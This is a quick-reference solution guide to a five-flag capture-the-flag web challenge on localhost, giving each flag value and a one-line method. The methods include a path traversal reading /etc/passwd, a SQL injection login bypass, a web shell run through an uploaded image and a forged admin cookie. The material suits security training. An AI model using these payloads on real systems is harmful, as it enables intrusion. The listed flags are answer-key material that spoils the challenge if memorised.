# CTF Challenge - Complete Solution Guide

## Quick Reference: All 5 Flags

### Flag 1: Information Disclosure
- **Location:** `/backup/config.txt`
- **Flag:** `flag{info_disclosure_vulnerability}`
- **How:** curl http://localhost:5000/backup/config.txt

### Flag 2: File Upload Bypass
- **Location:** Polyglot file execution  
- **Flag:** `flag{polyglot_file_executed}`
- **How:** Upload shell.jpg, then curl with ?cmd=id

### Flag 3: Path Traversal + SSTI
- **Location:** `/view` endpoint
- **Flag:** `flag{path_traversal_ssti_rce}`
- **How:** /view?file=....//../etc/passwd

### Flag 4: SQL Injection
- **Location:** Login form
- **Flag:** `flag{sql_injection_bypass}`
- **How:** Username: admin' --

### Flag 5: Privilege Escalation
- **Location:** `/admin/readflag` with cookie
- **Flag:** `flag{privilege_escalation_suid_binary_executed}`
- **How:** curl -b "admin=true" http://localhost:5000/admin/readflag

## Detailed Exploitations

See README.md for comprehensive exploitation guides.
See PROJECT_STATUS.md for implementation details.
